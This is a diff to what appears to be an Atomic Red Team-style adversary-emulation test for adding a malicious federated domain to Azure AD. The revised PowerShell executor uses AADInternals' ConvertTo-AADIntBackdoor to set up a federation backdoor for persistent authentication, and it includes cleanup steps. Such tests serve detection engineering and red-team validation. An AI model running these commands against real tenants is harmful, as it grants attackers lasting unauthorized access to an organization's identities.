@@ -4,8 +4,11 @@ atomic_tests:
 - name: Add Federation to Azure AD
   auto_generated_guid: 8906c5d0-3ee5-4f63-897a-f6cafd3fdbb7
   description: |
-    Add a new federation to Azure AD using PowerShell. The malicious Identity Provider to be added must be configured beforehand.
-    If ADFS is used as IdP, the Uris parameters can be found at 'https://<federationservice>.<domainname>.com/federationmetadata/2007-06/federationmetadata.xml'
+    Add a new federated domain to Azure AD using PowerShell.
+    The malicious domain to be federated must be configured beforehand (outside of the scope of this test):
+        1. Open Azure Portal
+        2. Add a new "custom domain name"
+        3. Verify the domain by following instructions (i.e. create the requested DNS record)
   supported_platforms:
   - azure-ad
   input_arguments:
@@ -17,59 +20,77 @@ atomic_tests:
       description: Password of azure_username
       type: String
       default: iamthebatman
-    active_logon_uri:
-      description: Active Logon Uri, available in federation metadata at <SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST> field if ADFS is used.
-      type: String
-      default: 'https://sts.contoso.com/adfs/ls/'
-    issuer_uri:
-      description: Issuer Uri, available in federation metadata at the "entityID" field if ADFS is used.
-      type: String
-      default: 'http://sts.contoso.com/adfs/services/trust'
-    metadata_uri:
-      description: Metadata exchange Uri, available in federation metadata at <Address xmlns="http://www.w3.org/2005/08/addressing"> field if ADFS is used.
-      type: String
-      default: 'https://sts.contoso.com/adfs/services/trust/mex'
-    public_key:
-      description: Public key of the X509 signing token certificate, in base64
-      type: String
-      default: "MzAgODIgMDEgMGEgMD...gZWQgOTkgMDIgMDMgMDEgMDAgMDE="
     domain_name:
-      description: New federation domain name
+      description: Malicious federated domain name
       type: String
-      default: "contoso.com"
+      default: contoso.com
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      AzureADPreview Powershell module must be installed. The Identity Provider to be federated must be configured (outside of the scope of this test).
+      AzureAD and AADInternals Powershell modules must be installed.
     prereq_command: |
-      if (Get-Module AzureADPreview) {exit 0} else {exit 1}
+      if ((Get-Module -ListAvailable -Name AzureAD) -And (Get-Module -ListAvailable -Name AADInternals)) {exit 0} else {exit 1}
     get_prereq_command: |
-      Install-Module -Name AzureADPreview -Force
+      Install-Module -Name AzureAD -Force
+      Install-Module -Name AADInternals -Force
   executor:
     command: |
-      Import-Module AzureADPreview
+      Import-Module AzureAD
+      Import-Module AADInternals
+
       $PWord = ConvertTo-SecureString -String "#{azure_password}" -AsPlainText -Force
       $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{azure_username}", $Pword
-      Connect-AzureAD -Credential $Credential > $null
-      $federationSettings = New-Object Microsoft.Open.AzureAD.Model.DomainFederationSettings
-      $federationSettings.ActiveLogOnUri = "#{active_logon_uri}"
-      $federationSettings.IssuerUri = "#{issuer_uri}"
-      $federationSettings.LogOffUri = $federationSettings.ActiveLogOnUri
-      $federationSettings.MetadataExchangeUri = "#{metadata_uri}"
-      $federationSettings.PassiveLogOnUri = $federationSettings.ActiveLogOnUri
-      $federationSettings.PreferredAuthenticationProtocol = "WsFed"
-      $federationSettings.SigningCertificate = "#{public_key}"
-      $new = New-AzureADExternalDomainFederation -ExternalDomainName "#{domain_name}" -FederationSettings $federationSettings
-      if ($new) { Write-Host "`nFederation successfully added to Azure AD" } else { Write-Host "`nThe federation setup failed" }
-      Get-AzureADExternalDomainFederation -ExternalDomainName "#{domain_name}"
+
+      try {
+        Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null
+      }
+      catch {
+        Write-Host "Error: AzureAD could not connect"
+        exit 1
+      }
+
+      try {
+        $domain = Get-AzureADDomain -Name "#{domain_name}"
+      }
+      catch {
+        Write-Host "Error: domain ""#{domain_name}"" not found"
+        exit 1
+      }
+      if (-Not $domain.IsVerified) {
+        Write-Host "Error: domain ""#{domain_name}"" not verified"
+        exit 1
+      }
+      
+      if ($domain.AuthenticationType -eq "Federated") {
+        Write-Host "Error: domain ""#{domain_name}"" already federated. Try with a different domain or re-create it before."
+        exit 1
+      }
+
+      $at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential
+      if (-Not $at) {
+        Write-Host "Error: AADInternals could not connect"
+        exit 1
+      }
+
+      $new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName "#{domain_name}"
+      if ($new) {
+        Write-Host "Federation successfully added to Azure AD"
+        Write-Host $new
+      }
+      else {
+        Write-Host "The federation setup failed"
+      }
+
       Write-Host "End of federation configuration."
     cleanup_command: |
       try {
-      Import-Module AzureADPreview -ErrorAction Ignore
-      $PWord = ConvertTo-SecureString -String "#{azure_password}" -AsPlainText -Force
-      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{azure_username}", $Pword
-      Connect-AzureAD -Credential $Credential -ErrorAction Ignore
-      Remove-AzureADExternalFederationDomain -ExternalDomainName "#{domain_name}"
+        Import-Module AzureAD -ErrorAction Ignore
+
+        $PWord = ConvertTo-SecureString -String "#{azure_password}" -AsPlainText -Force
+        $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{azure_username}", $Pword
+        Connect-AzureAD -Credential $Credential -ErrorAction Ignore > $null
+
+        Remove-AzureADDomain -Name "#{domain_name}" -ErrorAction Ignore
       } catch {}
     name: powershell
     
